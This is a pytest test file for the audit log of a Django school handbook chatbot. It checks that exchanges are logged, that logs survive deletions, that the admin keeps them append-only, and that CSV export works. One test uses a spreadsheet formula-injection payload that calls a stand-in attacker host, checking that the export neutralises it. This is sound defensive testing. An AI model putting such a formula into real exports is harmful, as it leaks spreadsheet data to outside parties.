"""Audit completeness: every exchange is logged with exactly what was asked,
what was retrieved, and what was answered — and an answer can never exist
without its audit row."""

import csv
import datetime
import io

import pytest
from django.contrib.auth import get_user_model
from django.urls import reverse

from accounts.models import Role
from audit.models import AuditLog
from chat.models import Conversation, Message
from chat.services import ask
from corpus.embeddings import get_embedder
from corpus.models import Chunk, Document

pytestmark = pytest.mark.django_db

User = get_user_model()


@pytest.fixture
def teacher():
    role = Role.objects.create(slug="teacher", name="Teacher")
    return User.objects.create_user(
        username="alvarez", first_name="Rosa", last_name="Alvarez", password="x", role=role
    )


@pytest.fixture
def handbook(teacher):
    doc = Document.objects.create(
        title="Staff handbook", tier=1, status=Document.Status.READY, last_updated=datetime.date(2026, 3, 1)
    )
    doc.allowed_roles.set([teacher.role])
    text = "A phone confiscated during class is returned at the end of the school day."
    Chunk.objects.create(document=doc, index=0, text=text, embedding=get_embedder().embed_query(text))
    return doc


def test_every_exchange_is_audited_with_full_retrieval_detail(teacher, handbook):
    conversation = Conversation.objects.create(user=teacher)
    answer = ask(teacher, conversation, "When is a confiscated phone returned?")

    log = AuditLog.objects.get()
    assert log.user == teacher
    assert log.username == "alvarez"
    assert log.role_slug == "teacher"
    assert log.question == "When is a confiscated phone returned?"
    assert log.answer == answer.content
    assert log.refused is False
    assert log.conversation == conversation
    assert len(log.retrieved) == 1
    entry = log.retrieved[0]
    assert entry["document_title"] == "Staff handbook"
    assert entry["rank"] == 1
    assert "end of the school day" in entry["text"]
    assert entry["document_id"] == handbook.id


def test_refusals_are_audited_too(teacher, handbook, settings):
    settings.RETRIEVAL_MAX_DISTANCE = 0.05
    conversation = Conversation.objects.create(user=teacher)
    ask(teacher, conversation, "utterly unrelated gibberish question")
    log = AuditLog.objects.get()
    assert log.refused is True
    assert log.retrieved == []


def test_no_answer_without_an_audit_row(teacher, handbook, monkeypatch):
    """If the audit write fails, the whole exchange must fail with it."""

    def boom(*args, **kwargs):
        raise RuntimeError("audit unavailable")

    monkeypatch.setattr("chat.services.record_chat", boom)
    conversation = Conversation.objects.create(user=teacher)
    with pytest.raises(RuntimeError):
        ask(teacher, conversation, "When is a confiscated phone returned?")
    assert Message.objects.count() == 0
    assert AuditLog.objects.count() == 0


def test_audit_survives_conversation_and_user_deletion(teacher, handbook):
    conversation = Conversation.objects.create(user=teacher)
    ask(teacher, conversation, "When is a confiscated phone returned?")
    conversation.delete()
    teacher.delete()
    log = AuditLog.objects.get()
    assert log.user is None
    assert log.username == "alvarez"
    assert log.role_slug == "teacher"
    assert log.question  # content untouched


def test_audit_is_append_only_in_admin(teacher, handbook, client):
    User.objects.create_superuser(username="root", password="rootpass")
    client.login(username="root", password="rootpass")
    conversation = Conversation.objects.create(user=teacher)
    ask(teacher, conversation, "When is a confiscated phone returned?")
    log = AuditLog.objects.get()
    # Viewable
    response = client.get(reverse("admin:audit_auditlog_change", args=[log.pk]))
    assert response.status_code == 200
    # But not editable or deletable
    from django.contrib.admin.sites import site

    from audit.admin import AuditLogAdmin

    admin_instance = AuditLogAdmin(AuditLog, site)
    assert not admin_instance.has_add_permission(None)
    assert not admin_instance.has_change_permission(None)
    assert not admin_instance.has_delete_permission(None)


def test_csv_export(teacher, handbook, client):
    User.objects.create_superuser(username="root", password="rootpass")
    client.login(username="root", password="rootpass")
    conversation = Conversation.objects.create(user=teacher)
    ask(teacher, conversation, "When is a confiscated phone returned?")

    response = client.post(
        reverse("admin:audit_auditlog_changelist"),
        {"action": "export_csv", "_selected_action": [AuditLog.objects.get().pk]},
    )
    assert response.status_code == 200
    assert response["Content-Type"].startswith("text/csv")
    rows = list(csv.DictReader(io.StringIO(response.content.decode())))
    assert len(rows) == 1
    row = rows[0]
    assert row["username"] == "alvarez"
    assert row["role"] == "teacher"
    assert row["question"] == "When is a confiscated phone returned?"
    assert "Staff handbook" in row["sources"]
    assert row["refused"] == "no"


def test_csv_export_neutralises_spreadsheet_formulas(teacher, handbook, client):
    """A question is user-controlled text that lands in a board member's
    spreadsheet. A cell starting with = + - @ would execute as a formula in
    Excel/Sheets, so the export prefixes it with an apostrophe."""
    User.objects.create_superuser(username="root", password="rootpass")
    client.login(username="root", password="rootpass")
    conversation = Conversation.objects.create(user=teacher)
    ask(teacher, conversation, '=HYPERLINK("http://evil.example/"&A1,"click me")')

    response = client.post(
        reverse("admin:audit_auditlog_changelist"),
        {"action": "export_csv", "_selected_action": [AuditLog.objects.get().pk]},
    )
    row = next(csv.DictReader(io.StringIO(response.content.decode())))
    assert row["question"].startswith("'=HYPERLINK")
    assert row["answer"] and not row["answer"].startswith(("=", "+", "-", "@"))
